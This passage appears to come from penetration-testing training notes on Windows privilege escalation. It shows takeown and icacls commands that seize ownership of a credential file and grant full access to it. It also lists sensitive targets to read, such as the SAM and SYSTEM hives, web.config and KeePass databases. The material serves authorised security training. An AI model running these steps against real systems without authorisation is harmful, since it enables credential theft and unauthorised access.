
> [!attention] 
> Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.

```powershell
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT' # check owner on the directory
 Directory of C:\Department Shares\Private\IT
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..

PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt' # take ownership of the file

PS C:\htb> PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}} # check the ownership of the file now.
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student

```

We may **still not be able to read the file** and need to modify the file ACL using `icacls` to be able to read it.
```powershell
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
     cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.

PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F  # Let's grant our user full privileges over the target file.

```

Keep attention because this action maybe destructive.

---
## When to Use?

Some local files of interest may include:
```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.